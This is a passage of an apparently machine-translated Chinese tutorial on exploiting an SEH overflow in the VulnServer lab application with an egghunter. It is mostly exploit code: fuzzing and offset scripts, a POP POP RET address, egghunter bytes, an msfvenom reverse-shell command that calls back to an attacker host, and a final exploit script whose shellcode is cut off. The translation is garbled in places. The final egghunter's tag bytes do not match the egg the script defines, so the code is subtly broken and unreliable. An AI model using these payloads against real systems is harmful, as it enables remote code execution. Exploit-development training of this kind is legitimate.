<p>[参考] [<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]" target="_blank" rel="noopener">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]</a></p>
<p><code>NTDisplayString</code>实际上是在Windows中使用相同的系统调用来显示蓝屏，那么这如何在我们的<strong>Egghunter中</strong>发挥<strong>作用？</strong></p>
<p>好吧，我们滥用了以下事实：该系统调用用于验证地址范围，并且指针也被读取而不被写入。</p>
<p>这种方法有一个小的缺点，它的系统调用号<code>NTDisplayString</code>无法更改，而且多年来，系统调用号在Windows版本和体系结构上均已更改。</p>
<p>当我写这篇文章时，我实际上遇到了我的Egghunter出现的一些问题，<code>Access Violation reading: FFFFFF</code>即执行<code>INT 2E</code>系统调用时。原因？</p>
<p>因为我试图在Windows的64位系统上运行Egghunter，所以我有点愚蠢，但是由于该应用程序被编译为32位应用程序并且过去没有太多问题，因此我对此没有多加考虑。</p>
<p>Corelan出色地解释了Egghunter的每个组装指令的功能，因此请查看此处的文章<a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener">。</a></p>
<hr>
<h1 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h1><h2 id="2-1-带Egghunter的VulnServer"><a href="#2-1-带Egghunter的VulnServer" class="headerlink" title="2.1 带Egghunter的VulnServer"></a>2.1 带Egghunter的VulnServer</h2><p>在此示例中，我将介绍<strong>VulnServer</strong>，这是一个故意易受攻击的服务器，它在端口9999上侦听任何传入的连接，并支持多种类型的命令，如之前在第1部分中看到的。</p>
<h3 id="2-1-1-模糊和发现崩溃"><a href="#2-1-1-模糊和发现崩溃" class="headerlink" title="2.1.1 模糊和发现崩溃"></a>2.1.1 模糊和发现崩溃</h3><p>现在类似于<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分，</a>我不想演示如何模糊<strong>VulnServer</strong>上的每个可用命令。如果您正在寻找类似的内容，请检查我们的<strong>booFuzz，</strong>它非常酷。在这种情况下，我只打算模糊<code>GMON</code>命令以节省时间并专注于开发部分本身。</p>
<p>让我们使用以下脚本对该命令进行简单的模糊处理来开始它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer=[&quot;A&quot;]</span><br><span class="line">counter=100</span><br><span class="line"></span><br><span class="line">while len(buffer) &lt;= 30:</span><br><span class="line">	buffer.append(&quot;A&quot;*counter)</span><br><span class="line">	counter=counter+200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">	print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(string)</span><br><span class="line">	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">	print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">	s.send((&apos;GMON /.:/&apos; + string))</span><br><span class="line">	s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(string)</span><br></pre></td></tr></table></figure>

<p>我们在这里所做的工作与第1部分中介绍的基本堆栈溢出非常相似，其中我们在进行以下操作</p>
<ol>
<li>在<strong>端口9999</strong>上连接到<strong>bof.local</strong></li>
<li>发送<code>GMON /.:/ + string += 200</code>-其中字符串=，<code>A</code>并按<code>200</code>每个周期递增。</li>
<li>关闭TCP连接</li>
</ol>
<p>一旦应用程序崩溃，脚本将开始运行，我们可以检查<strong>Immunity</strong>。</p>
<p>现在，当我们跳到Immunity时，我们可能会注意到一些有趣的东西，我注意到的第一件事就是<code>Access Violation when writing to [06500000]</code>Immunity的页脚，这是告诉我们该应用程序处于崩溃状态，并且实际上不知道下一步该<em>怎么做</em> -您可能还要注意，与包含第1部分的<strong>EIP</strong>值不同，它看起来很正常<code>41414141</code>-这是由于我们没有过度运行返回地址并获得对<strong>EIP寄存器的</strong>控制，而是超过了堆栈上的<strong>nSEH</strong>和<strong>SEH</strong>值。</p>
<p>让我们通过在Immunity中按下来建立<strong>SEH链</strong><code>ALT+S</code>。这样做之后，我们会注意到一些有趣的<code>41414141</code>输出，我们过去在<strong>EIP寄存器中</strong>看到的输出现在显示在<strong>SE Handler中</strong>。右键单击<code>41414141</code>并选择<code>Follow in Stack</code></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162251.png" class="lozad"></p>
<p>完美，我们现在可以使用用户提供的输入来覆盖指向<strong>nSEH</strong>和<strong>SEH</strong>的指针。现在，让我们找出必须提供多少用户提供的输入才能到达<strong>nSEH</strong>和<strong>SEH</strong>的指针</p>
<h3 id="2-1-2-寻找偏移"><a href="#2-1-2-寻找偏移" class="headerlink" title="2.1.2 寻找偏移"></a>2.1.2 寻找偏移</h3><p>在这里，我们再次找到偏移量，因为我确信您知道这是漏洞利用开发的非常普遍的部分，并且不仅适用于<strong>SEH Overlows-</strong>有几种不同的方法可以执行此<em>操作</em>，例如<em>手动</em>，<strong>metasploit</strong>和<strong>mona，</strong>但是由于偏爱，我会在这里坚持<strong>蒙娜丽莎</strong>。</p>
<p>首先，使用以下命令创建一个永不重复的字符串/循环模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 6000</span><br></pre></td></tr></table></figure>

<p>并将其与我们的模糊测试脚本结合在一起，但不必每次都重复A的增量200字节，我们只需将我们的模式与 <code>GMON :./</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with pattern containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure>

<p>现在，我们的应用程序将返回崩溃状态并报告a，<code>Access Violation</code>但是这次<strong>SE Handler</strong>包含<code>45336E45</code>的内容相比<code>41414141</code>-让我们再次跳转到堆栈并检查当前驻留在堆栈上的数据。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162302.png" class="lozad"></p>
<p>完善！如您所见，我们正在查看我们永不重复的字符串，并且无法仅通过在<strong>mona中</strong>使用以下命令之一来计算偏移量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br><span class="line">!mona po 1En2</span><br></pre></td></tr></table></figure>

<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162311.png" class="lozad"></p>
<p>如您所见，我们花了<strong>3515</strong> <strong>个字节</strong>来超出<strong>nSEH</strong>的值，而花了<strong>3519个字节</strong>来超过<strong>SE Handler</strong>的值-在我开始拼凑所有内容之前，我想首先花时间来查找任何不良字符。</p>
<h3 id="2-1-3-寻找坏字符"><a href="#2-1-3-寻找坏字符" class="headerlink" title="2.1.3 寻找坏字符"></a>2.1.3 寻找坏字符</h3><p>我不会在这里解释为什么我们需要找到坏字符，因为我在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分中</a>做了很好的工作，所以就去那里。</p>
<p>让我们使用下面的简单脚本，通过命令将每个可能的字符的字符串发送到<strong>VulnServer</strong><code>GMON</code>。当然，我们将<code>\x00</code>字符（即<strong>空字节）</strong>排除在外<strong>。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure>

<p>现在，仅简要介绍我们在这里所做的事情</p>
<ol>
<li><p>计算不良字符的数量并从<code>3515</code>我们的<strong>偏移量</strong>减去该值</p>
</li>
<li><p>发送 <code>3260 A&#39;s + 255 bad chars</code></p>
</li>
<li><p>发送<code>BBBB</code>以覆盖<strong>nSEH</strong>值</p>
</li>
<li><p>发送<code>CCCC</code>以覆盖<strong>SEH</strong>值</p>
</li>
<li><p>填充剩余空间 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDDD...</span><br></pre></td></tr></table></figure>

<ol>
<li>我们这样做的原因是我们没有填充剩余空间，所以<strong>SEH</strong>不会触发</li>
</ol>
</li>
</ol>
<p>ps：由于<strong>SE处理程序</strong>（又称52字节）之后空间的限制，我决定在覆盖<strong>nSEH</strong>和<strong>SEH</strong>之前发送错误字符</p>
<p>检查内存转储，我们可以看到除了<strong>空字节</strong>又名，我们实际上有零个坏字符<code>\x00</code></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162322.png" class="lozad"></p>
<h3 id="2-1-4-查找POP-POP-RET指令"><a href="#2-1-4-查找POP-POP-RET指令" class="headerlink" title="2.1.4 查找POP POP RET指令"></a>2.1.4 查找POP POP RET指令</h3><p>我已经详细说明<code>POP POP RET</code>了指令的顺序及其重要性，因此我将坚持实用并让上面的部分<code>A Mention on POP POP RET</code>进行讨论。</p>
<p>首先让我们找到一个适用的模块，该模块将使用以下带有<strong>mona的</strong>命令包含此指令序列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure>

<p>在这里，一个明显的选择是突出的，<code>efffunc.dll</code>因为它没有使用任何安全机制（例如<code>SafeSEH</code> 或）进行编译<code>ASLR</code></p>
<p>让我们双击该模块，然后验证组装说明并确保这是我们所需要的。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162340.png" class="lozad"></p>
<p>完美，我们有<code>POP EBX</code> <code>POP EBP</code>和<code>RETN</code>指令。这正是我们所需要的<code>POP POP RET</code></p>
<p>对于这一部分，我建议您在<code>POP POP RET</code>函数的开头放置一个断点，以便您可以逐步进行下一部分以了解会发生什么，只需在<strong>mona中</strong>双击所选模块，然后按<code>F2</code>一下<code>POP EBX</code>说明即可。</p>
<p>现在，我将修改python脚本，以如下所示用指令<code>seh</code>的值覆盖变量<code>POP POP RET</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010b4 pop,pop,ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 3515</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure>

<p>让我们运行此脚本，再次跳转到<strong>Immunity</strong>，看看发生了什么。</p>
<p>在我们检查堆栈或内存转储之前，让我们快速检查一下<strong>SEH链</strong></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162401.png" class="lozad"></p>
<p>完美，<strong>SE处理</strong>程序指向<code>POP POP RET</code>我们所选DLL中的指令，在这种情况下<code>0x625010B4</code>-&gt;<code>essfunc.dll</code></p>
<p>快速分析堆栈和内存转储也都可以。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162409.png" class="lozad"></p>
<p>当然，因为我们只是在应用程序处于崩溃状态时将所有内容拼凑在一起，但是让我们将我们的异常传递给程序，通过该程序将堆栈上的<strong>SE Handler</strong><code>Shift+F9</code>的值发送到<strong>EIP寄存器</strong>，<strong>EIP寄存器</strong>将依次跳转按照我们的指示。<code>POP POP RET</code></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162422.png" class="lozad"></p>
<p>完善！正是我们所需要的，将我们的<strong>SE Handler</strong>值<code>625010B4</code>in推送到<code>EIP</code>了我们的<code>POP POP RET</code>说明中，如左上方所示。</p>
<p>现在，如果我们通过按逐步操作<code>F7</code>，则将首先进行操作<code>POP EBX</code> <code>POP EBP</code>，最后进行操作<code>RETN</code>，这将使我们达到<strong>nSEH</strong>的值-在这种情况下<code>BBBB</code></p>
<p>只是为了更详细地解释这里发生了什么</p>
<ul>
<li><strong>POP EBX</strong> - <em>POP的</em>栈顶到<strong>EBX注册</strong> - <strong>7DEB6AB9</strong></li>
<li><strong>POP EBP</strong> - <em>POP的</em>栈顶到<strong>EBP注册</strong> - <strong>0237ED34</strong></li>
<li><strong>RETN</strong> - <em>返回</em> /堆栈的顶部为推动价值<strong>EIP寄存器</strong> - <strong>0237FFC4</strong></li>
</ul>
<p>现在您可能会注意到<strong>0237FFC4</strong>看起来很熟悉，如果再次查看<strong>SEH Chain</strong>，我们将看到<strong>0237FFC4</strong>对应于<strong>nSEH</strong></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162431.png" class="lozad"></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162442.png" class="lozad"></p>
<p>如您所见，<strong>EIP</strong>点也<code>024FFFC4</code>与左上方的指令相关，查看这些指令，我们可以看到“ 42 42 42 42 <code>which represents our</code>“ B” * 4”。</p>
<h3 id="2-1-5-生成Egghunter"><a href="#2-1-5-生成Egghunter" class="headerlink" title="2.1.5 生成Egghunter"></a>2.1.5 生成Egghunter</h3><p>正如我已经谈到了为什么使用Egghunter以及它们如何工作一样，我将直接进入它，首先让我们分析堆栈以及在这里使用什么。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162451.png" class="lozad"></p>
<p>如前所述，需要<strong>3515字节</strong>来获取太<strong>nSEH，</strong>而需要<strong>3519字节</strong>来覆盖指向<strong>SE处理程序</strong>的指针，之后我们有<strong>52字节</strong>的空间，在这种情况下，由<code>DDDDD...</code>- 表示：-当然52字节对于我们的<em>shellcode</em>来说不是足够的空间，但是对于Egghunter来说已经足够了，因为我们只需要<strong>32个字节</strong> - 只要我们可以使用相关的Egghunter <em>标签</em>通过其他方式将shellcode放入内存，我们就应该能够执行。</p>
<p>像往常一样，由于简单，我将在此阶段使用<strong>mona</strong>来帮助我。</p>
<p><strong>使用Mona生成Egghunter</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona egg -t MOCH</span><br></pre></td></tr></table></figure>

<p>默认情况下，<strong>mona</strong>会生成一个带有默认标签的Egghunter，它的默认标签<code>w00t</code>可以很好地工作，但是在这里我选择指定一个自定义标签<code>MOCH</code></p>
<p>完美，现在让我们将其添加到我们的利用脚本中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">egghunter = (&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br></pre></td></tr></table></figure>

<p>值得注意的是，Egghunters也应检查以前发现的不良字符。</p>
<p>我们还将<code>tag</code>在变量<strong>TWICE中</strong>定义变量，以便Egghunter在执行和搜索内存时不会发现自己。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egg = &apos;MOCHMOCH&apos;</span><br></pre></td></tr></table></figure>

<p>我还将花时间<code>junk</code>用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br></pre></td></tr></table></figure>

<p>这将允许我们在<strong>SEH</strong>之后直接添加Egghunter shell代码，然后添加一堆D来填充剩余空间，以防万一。</p>
<p>现在让我们生成一些shell代码，对整体漏洞进行最后调整，然后尝试一下。</p>
<h3 id="2-1-6-跳到Egghunter"><a href="#2-1-6-跳到Egghunter" class="headerlink" title="2.1.6 跳到Egghunter"></a>2.1.6 跳到Egghunter</h3><p>现在只是重申此处的目的是<strong>超速**</strong>SEH<strong>，执行一个<code>POP POP RET</code>序列，该序列</strong>又将nSEH<strong>的值</strong>压<strong>入</strong>EIP寄存器** -在这种情况下，我们希望将Egghunter的地址放在<strong>nSEH之上</strong>或以某种形式的指令将使我们跳入我们的Egghunter shellcode，再次，如果我们检查堆栈，我们会发现我们走得太远。</p>
<h3 id="2-1-7-生成Shellcode和最终利用"><a href="#2-1-7-生成Shellcode和最终利用" class="headerlink" title="2.1.7 生成Shellcode和最终利用"></a>2.1.7 生成Shellcode和最终利用</h3><p>一如既往，我将在这里使用MSFVenom生成一些shellcode，因为我们并不是真正在与高级防病毒软件或任何其他工具作斗争，所以不必花哨，我们只需使用下面的代码即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>

<p>现在生成了很棒的shell代码，我们只是将其弹出到最终的利用中。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162511.png" class="lozad"></p>
<p>在这种情况下，你可以看到我们会从内存地址跳转<strong>0237FFC4</strong>到<strong>0237FFCC</strong>这将是在那里我们Egghunter会坐下。</p>
<p>现在在这里，我们只是用<strong>0237FFCC</strong>覆盖<strong>nSEH</strong>的地址，但是就像我说的那样，它不是很实用，并且最好做一个简单的短跳转（也称为操作码）-但是有一个小的变化。该指令只有<strong>2个字节</strong>，<strong>nSEH</strong>需要<strong>4个字节。</strong><code>EB``EB</code></p>
<p>这不是一个大问题，因为我们可以简单地使用<code>NOPS</code>aka，<code>\x90</code>所以我们在这里要做的是填充<strong>nSEH</strong>，<code>\x90\x90</code>这意味着<strong>2/4个字节</strong>已满，然后是代表跳转6个字节的<code>EB</code>指令<code>\xeb\x06</code>。现在，<strong>nSEH</strong>中填充了<strong>4/4个字节</strong></p>
<p>我们利用现在技术上跳<strong>8个字节</strong>，但我们只需要跳<strong>6个字节</strong>，因为我们<em>真的</em>只是<em>滑动</em>下来<strong>NOPS</strong>所以6个字节是所有的需要。</p>
<p>太好了，现在在漏洞利用程序中更新<strong>nSEH</strong>变量以反映以下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure>

<p>当然，<strong>little endian</strong>再次是相反顺序的原因。</p>
<p><strong>最终利用</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#Vulnserver GMON SEH Overflow w/ Egghunter</span><br><span class="line">#Author: m0chan</span><br><span class="line">#Date: 28/08/2019</span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot; #0x909006be - nop,nop,jump 6 bytes with EB into egghunter</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010br pop,pop,ret</span><br><span class="line"></span><br><span class="line">eggnops = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">egghunter = (</span><br><span class="line">&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x74\x65\x65\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br><span class="line"></span><br><span class="line">egg = &apos;MOCHMOCH&apos;</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 -e x86/shikata_ga_nai EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x80\x0a\x0c\x0d&quot;</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xda\xc4\xbf\xcf\xa2\xc0\xf1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1&quot;</span><br><span class="line">&quot;\x52\x83\xeb\xfc\x31\x7b\x13\x03\xb4\xb1\x22\x04\xb6\x5e\x20&quot;</span><br><span class="line">&quot;\xe7\x46\x9f\x45\x61\xa3\xae\x45\x15\xa0\x81\x75\x5d\xe4\x2d&quot;</span><br><span class="line">&quot;\xfd\x33\x1c\xa5\x73\x9c\x13\x0e\x39\xfa\x1a\x8f\x12\x3e\x3d&quot;</span><br><span 